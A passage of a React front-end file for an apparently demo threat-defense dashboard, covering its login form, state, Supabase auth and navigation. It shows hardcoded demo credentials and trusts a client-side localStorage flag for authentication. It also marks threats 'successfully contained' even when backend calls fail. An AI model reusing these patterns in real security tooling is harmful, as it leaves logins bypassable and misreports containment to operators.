                <input value={password} onChange={event => { setPassword(event.target.value); setError(""); }} type={showPassword ? "text" : "password"} autoComplete={mode === "login" ? "current-password" : "new-password"} placeholder="Enter your password" className="w-full rounded-2xl border border-white/[.08] bg-white/[.025] px-4 py-3 pr-20 text-sm text-white outline-none placeholder:text-[#555155] focus:border-[#8049D9]/70" required />
                <button type="button" onClick={() => setShowPassword(value => !value)} className="absolute right-3 top-1/2 -translate-y-1/2 px-1 text-[10px] font-bold uppercase tracking-[.12em] text-[#8f8b8d] hover:text-white">{showPassword ? "Hide" : "Show"}</button>
              </div>
            </label>
            {mode === "register" && <label className="block text-xs font-semibold text-[#aaa6a8]">Confirm password
              <input value={confirmPassword} onChange={event => { setConfirmPassword(event.target.value); setError(""); }} type={showPassword ? "text" : "password"} autoComplete="new-password" placeholder="Repeat your password" className="mt-2 w-full rounded-2xl border border-white/[.08] bg-white/[.025] px-4 py-3 text-sm text-white outline-none placeholder:text-[#555155] focus:border-[#8049D9]/70" required />
            </label>}
            {error && <p role="alert" className="rounded-xl border border-[#ff6b81]/20 bg-[#ff6b81]/[.08] px-3 py-2 text-xs text-[#ff8799]">{error}</p>}
            <button type="submit" className="flex w-full items-center justify-center gap-2 rounded-2xl bg-[#ebe6e7] py-3.5 text-xs font-bold text-[#111] transition hover:bg-white">{mode === "login" ? <LogIn size={15}/> : <UserPlus size={15}/>} {mode === "login" ? "Sign in to workspace" : "Create account"}</button>
          </form>
          {mode === "login" && <>
            <div className="my-5 flex items-center gap-3 text-[10px] font-bold uppercase tracking-[.14em] text-[#555155]"><span className="h-px flex-1 bg-white/[.07]"/>or continue with<span className="h-px flex-1 bg-white/[.07]"/></div>
            <div className="grid gap-3 sm:grid-cols-2">
              <button type="button" onClick={handleGoogleClick} className="flex items-center justify-center gap-2 rounded-2xl border border-white/[.1] bg-white/[.025] py-3.5 text-xs font-bold text-white transition hover:bg-white/[.07] hover:border-[#4285F4]/60"><Chrome size={15} className="text-[#4285F4]"/> Google</button>
              <button type="button" onClick={handleGithubClick} className="flex items-center justify-center gap-2 rounded-2xl border border-white/[.1] bg-white/[.025] py-3.5 text-xs font-bold text-white transition hover:bg-white/[.07] hover:border-white/40"><Github size={15}/> GitHub</button>
            </div>
          </>}
          {mode === "login" && <div className="mt-6 rounded-2xl border border-[#8049D9]/20 bg-[#8049D9]/[.07] p-3 text-[11px] leading-5 text-[#aaa6a8]">Demo access: <span className="font-semibold text-[#d4c5ff]">analyst@cybershield.ai</span> / <span className="font-semibold text-[#d4c5ff]">shield2026</span> (or use any email!)</div>}
          <div className="mt-6 flex items-center justify-center gap-2 text-xs text-[#777477]">
            <span>{mode === "login" ? "New to AI KAVACH?" : "Already have an account?"}</span>
            <button type="button" onClick={switchMode} className="font-semibold text-[#bda6ff] hover:text-white">{mode === "login" ? "Register" : "Sign in"}</button>
          </div>
        </div>
        <p className="mt-6 text-center text-[10px] text-[#555155]">Protected workspace access • AI KAVACH</p>
      </div>
    </main>
  );
}

function App() {
  const [authenticated, setAuthenticated] = useState(() => localStorage.getItem("cybershield-auth") === "true");
  const [currentUser, setCurrentUser] = useState(() => {
    try {
      return JSON.parse(localStorage.getItem("cybershield-current-user")) || {
        name: "Security Analyst",
        email: "analyst@cybershield.ai"
      };
    } catch {
      return { name: "Security Analyst", email: "analyst@cybershield.ai" };
    }
  });
  const [active, setActive] = useState("Overview");
  const [query, setQuery] = useState("");
  const [mobileOpen, setMobileOpen] = useState(false);
  const [toast, setToast] = useState("");
  const [scanModalOpen, setScanModalOpen] = useState(false);
  const [showNotifications, setShowNotifications] = useState(false);
  const [threatList, setThreatList] = useState(threats);
  const [notificationsList, setNotificationsList] = useState([
    { id: "n1", title: "Phishing Website Blocked", desc: "Perimeter DNS blocked access to login-secure-account.xyz.", time: "2m ago", type: "CRITICAL", read: false },
    { id: "n2", title: "Anomalous Login Attempt", desc: "Detected unfamiliar device IP: 198.51.100.24 targeting analyst account.", time: "15m ago", type: "HIGH", read: false },
    { id: "n3", title: "AI Neural Engine Active", desc: "FastAPI Neural Heuristic scanner operational on port 8000.", time: "1h ago", type: "SAFE", read: false }
  ]);
  const [selectedEvidence, setSelectedEvidence] = useState(null);
  const [blockedDomains, setBlockedDomains] = useState([
    { id: "bd-1", domain: "login-secure-account.xyz", date: "2 mins ago", reason: "Credential Phishing Lure", hitsBlocked: 34 },
    { id: "bd-2", domain: "verify-portal-update.com", date: "1 hour ago", reason: "Typosquatting & SSO Fake", hitsBlocked: 19 },
    { id: "bd-3", domain: "bank-security-kyc-alert.net", date: "Yesterday", reason: "Financial Phishing & OTP Harvester", hitsBlocked: 52 },
    { id: "bd-4", domain: "executive-payroll-cloud.info", date: "3 days ago", reason: "BEC Impersonation Domain", hitsBlocked: 14 }
  ]);
  const [vipList, setVipList] = useState([
    { id: "vip-1", name: "Elena Rostova", role: "Chief Executive Officer", email: "elena.ceo@cybershield.ai", attacksBlocked: 14, status: "Under Active Monitoring" },
    { id: "vip-2", name: "Marcus Vance", role: "Chief Financial Officer", email: "marcus.cfo@cybershield.ai", attacksBlocked: 8, status: "Protected" },
    { id: "vip-3", name: "David Kim", role: "VP of Engineering", email: "david.kim@cybershield.ai", attacksBlocked: 3, status: "Protected" },
    { id: "vip-4", name: "Sarah Chen", role: "Chief Information Security Officer", email: "ciso@cybershield.ai", attacksBlocked: 21, status: "Hardened MFA" }
  ]);
  const [settings, setSettings] = useState({
    autoContainment: true,
    emailQuarantine: true,
    darkWebMonitoring: true,
    strictHeuristics: false,
    dnsSinkhole: true,
    voiceDeepfakeShield: true,
    soundAlerts: false
  });

  const handleToggleSetting = (key, val) => {
    setSettings(prev => ({ ...prev, [key]: val }));
    notify(`Setting '${key}' updated to ${val ? "ON" : "OFF"}.`);
  };

  const handleBlockDomain = (domainObj) => {
    setBlockedDomains(prev => [domainObj, ...prev]);
  };

  const handleUnblockDomain = (id) => {
    setBlockedDomains(prev => prev.filter(d => d.id !== id));
  };

  const initials = useMemo(() => {
    const parts = (currentUser.name || "Analyst").trim().split(" ");
    if (parts.length >= 2) {
      return (parts[0][0] + parts[1][0]).toUpperCase();
    }
    return (parts[0] || "A").slice(0, 2).toUpperCase();
  }, [currentUser]);

  useEffect(() => {
    // Load live threats from database via backend API
    api.getThreats()
      .then((data) => {
        if (Array.isArray(data) && data.length > 0) {
          const iconLookup = {
            Globe2,
            LockKeyhole,
            UserRound,
            FileWarning,
            Bug,
            AlertTriangle
          };
          const mapped = data.map((t) => ({
            id: t.id,
            title: t.title,
            source: t.source,
            score: t.score,
            level: t.level,
            action: t.status === "CONTAINED" ? "Contained ✓" : t.action,
            icon: iconLookup[t.icon_name] || (t.category === "Vulnerability / Bug" ? Bug : ShieldAlert),
            category: t.category,
            isContained: t.status === "CONTAINED"
          }));
          setThreatList(mapped);
        }
      })
      .catch((e) => console.warn("Initial threats sync warning:", e.message));
  }, []);

  useEffect(() => {
    if (!supabase) return undefined;

    supabase.auth.getSession().then(async ({ data: { session } }) => {
      if (session) {
        setAuthenticated(true);
        await saveProfile(session.user);
      }
    });

    const { data: { subscription } } = supabase.auth.onAuthStateChange(async (_event, session) => {
      if (session) {
        localStorage.setItem("cybershield-auth", "true");
        setAuthenticated(true);
        await saveProfile(session.user);
      }
    });

    return () => subscription.unsubscribe();
  }, []);

  const filtered = useMemo(() => {
    const q = query.toLowerCase().trim();
    if (!q) return threatList;
    return threatList.filter(t => `${t.title} ${t.source} ${t.level}`.toLowerCase().includes(q));
  }, [query, threatList]);

  const notify = (message) => {
    setToast(message);
    setTimeout(() => setToast(""), 2500);
  };

  const handleThreatAction = async (t) => {
    try {
      if (t.action.toLowerCase().includes("block")) {
        await api.blockUrl(t.source, `Blocked threat: ${t.title}`);
      } else if (t.action.toLowerCase().includes("quarantine")) {
        await api.quarantine(t.source, "attachment", `Quarantined threat: ${t.title}`);
      } else if (t.action.toLowerCase().includes("revoke")) {
        await api.revokeSession("sess_compromised", t.source, `Revoked: ${t.title}`);
      } else if (t.action.toLowerCase().includes("remediate")) {
        await api.quarantine(t.source, "code_bug", `Remediated security bug: ${t.title}`);
      }
    } catch (e) {
      console.warn("Backend action call warning:", e.message);
    }


    setThreatList(prev => prev.map(item => item.title === t.title ? { ...item, action: "Contained ✓", isContained: true } : item));
    setNotificationsList(prev => [
      {
        id: "notif-" + Date.now(),
        title: `${t.action} Action Executed`,
        desc: `Threat '${t.title}' (${t.source}) successfully contained and recorded in incident database.`,
        time: "Just now",
        type: "SAFE",
        read: false
      },
      ...prev
    ]);
    notify(`${t.action} completed for ${t.title}!`);
  };

  const handleExecuteResponseWorkflow = async () => {
    try {
      await api.blockUrl("login-secure-account.xyz", "Automated AI Containment workflow");
      await api.quarantine("invoice_2026.zip", "attachment", "Automated AI Containment workflow");
      await api.revokeSession("sess_compromised", "analyst@target.com", "Automated AI Containment workflow");
    } catch (e) {
      console.warn("Workflow call warning:", e.message);
    }

    setThreatList(prev => prev.map(item => ({ ...item, action: "Contained ✓", isContained: true })));
    setNotificationsList(prev => [
      {
        id: "wf-" + Date.now(),
        title: "Containment Plan Executed",
        desc: "All active phishing domains blocked, attachments quarantined, and suspicious sessions revoked.",
        time: "Just now",
        type: "SAFE",
        read: false
      },
      ...prev
    ]);
    notify("Response workflow executed! Active threats contained.");
  };

  const oauthLogin = async (provider) => {
    if (!supabase) return;

    const { error } = await supabase.auth.signInWithOAuth({
      provider,
      options: { redirectTo: window.location.origin }
    });

    if (error) throw error;
  };

  const emailAuth = async ({ mode, name, email, password }) => {
    if (!supabase) return;

    if (mode === "register") {
      const { data, error } = await supabase.auth.signUp({
        email,
        password,
        options: { data: { full_name: name } }
      });
      if (error) throw error;
      if (!data.session) throw new Error("Check your email to confirm your account, then sign in.");
      return;
    }

    const { error } = await supabase.auth.signInWithPassword({ email, password });
    if (error) throw error;
  };

  const saveProfile = async (user) => {
    if (!supabase || !user) return;

    const metadata = user.user_metadata || {};
    const { error } = await supabase.from("profiles").upsert({
      id: user.id,
      full_name: metadata.full_name || metadata.name || "Security Analyst",
      avatar_url: metadata.avatar_url || metadata.picture || null,
      email: user.email || null,
      provider: user.app_metadata?.provider || "email"
    }, { onConflict: "id" });
    if (error) console.error("Could not save profile:", error.message);
  };

  const handleLogin = async (user) => {
    localStorage.setItem("cybershield-auth", "true");
    if (user) {
      localStorage.setItem("cybershield-current-user", JSON.stringify(user));
      setCurrentUser(user);
    } else {
      const stored = JSON.parse(localStorage.getItem("cybershield-current-user") || "null");
      if (stored) setCurrentUser(stored);
    }
    setAuthenticated(true);
    if (supabase) {
      const { data: { user: supaUser } } = await supabase.auth.getUser();
      await saveProfile(supaUser);
    }
  };

  const logout = async () => {
    if (supabase) await supabase.auth.signOut();
    localStorage.removeItem("cybershield-auth");
    localStorage.removeItem("cybershield-current-user");
    setAuthenticated(false);
  };

  if (!authenticated) return <AuthScreen onLogin={handleLogin} onEmailAuth={async (credentials) => { await emailAuth(credentials); await handleLogin(); }} onGoogleLogin={() => oauthLogin("google")} onGithubLogin={() => oauthLogin("github")} />;

  const nav = [
    ["Overview", LayoutDashboard],
    ["Threat Detection", ShieldAlert],
    ["Phishing", Globe2],
    ["Impersonation", UserRound],
    ["Account Takeover", LockKeyhole],
    ["Deepfake", Fingerprint],
    ["Network", Network],
    ["Incidents", FileWarning],
  ];

  return (
    <div className="min-h-screen bg-[#090909] text-[#ebe6e7]">
      <div className="fixed inset-0 pointer-events-none opacity-40 grid-bg" />

      {mobileOpen && (
        <div className="fixed inset-0 z-40 bg-black/70 lg:hidden" onClick={() => setMobileOpen(false)} />
      )}

      <aside className={`fixed left-0 top-0 z-50 flex h-screen w-[270px] flex-col border-r border-white/[0.06] bg-[#0d0d0d] px-5 py-6 transition-transform lg:translate-x-0 ${mobileOpen ? "translate-x-0" : "-translate-x-full"}`}>
        <div className="mb-10 flex items-center justify-between px-2">
          <div className="flex items-center gap-3">
            <div className="grid h-10 w-10 place-items-center rounded-2xl bg-[#3d2eb1] shadow-[0_0_35px_rgba(61,46,177,.35)]">
              <ShieldCheck size={20} />
            </div>
            <div>
              <div className="text-sm font-black tracking-tight">AI KAVACH</div>
              <div className="text-[10px] font-bold tracking-[.28em] text-[#8f8b8d]">THREAT DEFENSE</div>
            </div>
          </div>
          <button className="lg:hidden text-[#8f8b8d]" onClick={() => setMobileOpen(false)}><X size={20}/></button>
        </div>

        <div className="mb-3 px-3 text-[10px] font-bold uppercase tracking-[.22em] text-[#666365]">Workspace</div>
        <nav className="space-y-1">
          {nav.map(([name, Icon]) => (
            <button key={name} onClick={() => { setActive(name); setMobileOpen(false); }}
              className={`group flex w-full items-center gap-3 rounded-2xl px-3 py-3 text-left text-[13px] font-medium transition ${
                active === name ? "bg-[#3d2eb1]/20 text-white" : "text-[#858184] hover:bg-white/[.04] hover:text-white"
              }`}>
              <Icon size={17} className={active === name ? "text-[#bda6ff]" : "text-[#646064] group-hover:text-[#aaa6a8]"} />
              <span>{name}</span>
              {name === "Incidents" && <span className="ml-auto rounded-full bg-[#ff6b81]/10 px-2 py-0.5 text-[9px] font-bold text-[#ff8294]">8</span>}
            </button>
          ))}
        </nav>

        <div className="mt-auto space-y-1">
          <button
            onClick={() => { setActive("Settings"); setMobileOpen(false); }}
            className={`flex w-full items-center gap-3 rounded-2xl px-3 py-3 text-[13px] transition ${
              active === "Settings" ? "bg-[#3d2eb1]/20 text-white" : "text-[#858184] hover:bg-white/[.04] hover:text-white"
            }`}
          >
            <Settings size={17} className={active === "Settings" ? "text-[#bda6ff]" : "text-[#646064]"} /> Settings
          </button>
          <div className="mt-4 flex items-center gap-3 rounded-2xl border border-white/[.06] bg-white/[.025] p-3">
            <div className="grid h-9 w-9 place-items-center rounded-full bg-gradient-to-br from-[#8049D9] to-[#deaff6] text-xs font-black text-white">{initials}</div>
            <div className="min-w-0">
              <div className="truncate text-xs font-semibold">{currentUser.name}</div>
              <div className="truncate text-[10px] text-[#666365]">{currentUser.email}</div>
            </div>
            <button aria-label="Sign out" title="Sign out" onClick={logout} className="ml-auto rounded-lg p-1.5 text-[#666365] hover:bg-white/[.06] hover:text-white"><LogOut size={15} /></button>
          </div>
        </div>
      </aside>

      <main className="relative lg:pl-[270px] pb-24 lg:pb-0">
        <header className="sticky top-0 z-30 flex h-[76px] items-center gap-3 border-b border-white/[.05] bg-[#090909]/85 px-5 backdrop-blur-xl lg:px-9">
          <button className="rounded-xl p-2 text-[#8f8b8d] hover:bg-white/[.05] lg:hidden" onClick={() => setMobileOpen(true)}><Menu size={20}/></button>
          <div className="relative max-w-[390px] flex-1">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-[#555155]" size={16}/>
            <input value={query} onChange={e => setQuery(e.target.value)} placeholder="Search threats, domains, users..."
              className="w-full rounded-2xl border border-white/[.06] bg-white/[.025] py-2.5 pl-10 pr-4 text-xs text-white outline-none placeholder:text-[#555155] focus:border-[#8049D9]/60"/>
          </div>
          <div className="relative">
            <button
              onClick={() => setShowNotifications(prev => !prev)}
              className="relative rounded-2xl border border-white/[.06] p-2.5 text-[#8f8b8d] hover:bg-white/[.05] hover:text-white transition"
              title="System Alerts"
            >
              <Bell size={17}/>
              {notificationsList.some(n => !n.read) && (
                <span className="absolute right-2 top-2 h-2 w-2 rounded-full bg-[#ff6b81] ring-2 ring-[#090909] animate-pulse"/>
              )}
            </button>
            <NotificationDropdown
              isOpen={showNotifications}
              notifications={notificationsList}
              onMarkAllRead={() => setNotificationsList(prev => prev.map(n => ({ ...n, read: true })))}
              onClear={() => setNotificationsList([])}
              onDismiss={(id) => setNotificationsList(prev => prev.map(n => n.id === id ? { ...n, read: true } : n))}
              onClose={() => setShowNotifications(false)}
            />
          </div>
          <button onClick={() => notify("Help center opened.")} className="hidden rounded-2xl border border-white/[.06] p-2.5 text-[#8f8b8d] hover:bg-white/[.05] sm:block"><CircleHelp size={17}/></button>
          <div className="hidden h-8 w-px bg-white/[.07] sm:block"/>
          <div className="hidden text-right sm:block"><div className="text-xs font-semibold">{currentUser.name.split(" ")[0]}</div><div className="text-[10px] text-[#666365]">Online</div></div>
          <div className="grid h-9 w-9 place-items-center rounded-full bg-[#242424] text-xs font-black">{initials}</div>
        </header>

        <section className="mx-auto max-w-[1500px] px-5 py-7 lg:px-9 lg:py-10">
          {active === "Overview" && (
            <OverviewView
              currentUser={currentUser}
              threatList={threatList}
              query={query}
              handleThreatAction={handleThreatAction}
              handleExecuteResponseWorkflow={handleExecuteResponseWorkflow}
              notify={notify}
              onOpenEvidence={(ev) => setSelectedEvidence(ev)}
              onOpenScan={() => setScanModalOpen(true)}
              setActive={setActive}
            />
          )}

          {active === "Threat Detection" && (
            <ThreatDetectionView
              threats={threatList}
              onThreatAction={handleThreatAction}
              onOpenEvidence={(ev) => setSelectedEvidence(ev)}
              onOpenScan={() => setScanModalOpen(true)}
              notify={notify}
            />
          )}

          {active === "Phishing" && (
            <PhishingView
              blockedDomains={blockedDomains}
              onBlockDomain={handleBlockDomain}
              onUnblockDomain={handleUnblockDomain}
              onOpenScan={() => setScanModalOpen(true)}
              notify={notify}
            />
          )}

          {active === "Impersonation" && (
            <ImpersonationView
              vipList={vipList}
              onOpenEvidence={(ev) => setSelectedEvidence(ev)}
              notify={notify}
            />
          )}

          {active === "Account Takeover" && (
            <AccountTakeoverView notify={notify} />
          )}

          {active === "Deepfake" && (
            <DeepfakeView notify={notify} />
          )}

          {active === "Network" && (
            <NetworkView notify={notify} />
          )}

          {active === "Incidents" && (
            <IncidentsView
              onOpenEvidence={(ev) => setSelectedEvidence(ev)}
              notify={notify}
            />
          )}

          {active === "Settings" && (
            <SettingsView
              settings={settings}
              onToggleSetting={handleToggleSetting}
              currentUser={currentUser}
              onLogout={logout}
              notify={notify}
            />
          )}
        </section>

        {/* Android / Mobile Bottom Navigation Bar */}
        <nav className="fixed bottom-0 left-0 right-0 z-40 flex h-16 items-center justify-around border-t border-white/[0.08] bg-[#0d0d0d]/95 backdrop-blur-xl px-2 lg:hidden">
          <button
            onClick={() => setActive("Overview")}
            className={`flex flex-col items-center gap-1 py-1 px-3 text-[10px] font-semibold transition ${
              active === "Overview" ? "text-[#bda6ff]" : "text-[#777] hover:text-white"
            }`}
          >
            <LayoutDashboard size={18} />
            <span>Home</span>
          </button>

          <button
            onClick={() => setActive("Threat Detection")}
            className={`flex flex-col items-center gap-1 py-1 px-3 text-[10px] font-semibold transition ${
              active === "Threat Detection" ? "text-[#bda6ff]" : "text-[#777] hover:text-white"
            }`}
          >
            <ShieldAlert size={18} />
            <span>Threats</span>
          </button>

          {/* Floating Center AI Scan Button */}
          <button
            onClick={() => setScanModalOpen(true)}
            className="relative -top-3 flex h-12 w-12 items-center justify-center rounded-full bg-gradient-to-tr from-[#3d2eb1] to-[#8049D9] text-white shadow-[0_0_20px_rgba(128,73,217,0.5)] transition active:scale-95"
            title="Run AI Scan"
          >
            <Zap size={20} className="fill-white" />
          </button>

          <button
            onClick={() => setActive("Phishing")}
            className={`flex flex-col items-center gap-1 py-1 px-3 text-[10px] font-semibold transition ${
              active === "Phishing" ? "text-[#bda6ff]" : "text-[#777] hover:text-white"
            }`}
          >
            <Globe2 size={18} />
            <span>Phishing</span>
          </button>

          <button
            onClick={() => setMobileOpen(true)}
            className="flex flex-col items-center gap-1 py-1 px-3 text-[10px] font-semibold text-[#777] hover:text-white transition"
          >
            <Menu size={18} />
            <span>Modules</span>
          </button>
        </nav>
      </main>

      {toast && <div className="fixed bottom-5 right-5 z-[60] flex items-center gap-2 rounded-2xl border border-white/[.08] bg-[#191919] px-4 py-3 text-xs shadow-2xl"><Check size={14} className="text-[#5fe0a5]"/>{toast}</div>}

      <EvidenceModal
        evidence={selectedEvidence}
        onClose={() => setSelectedEvidence(null)}
        onAction={handleThreatAction}
      />

      <AIScanModal
        isOpen={scanModalOpen}
        onClose={() => setScanModalOpen(false)}
        onThreatDetected={(newThreat) => {
          setThreatList(prev => [newThreat, ...prev]);
          setNotificationsList(prev => [
            {
              id: "scan-" + Date.now(),
              title: "New Threat Detected by AI",
              desc: `${newThreat.title} (${newThreat.source}) flagged with ${newThreat.score}% risk score.`,
              time: "Just now",
              type: newThreat.level,
              read: false
            },
            ...prev
          ]);
        }}
        notify={notify}
      />
    </div>
  );
}

createRoot(document.getElementById("root")).render(<App />);
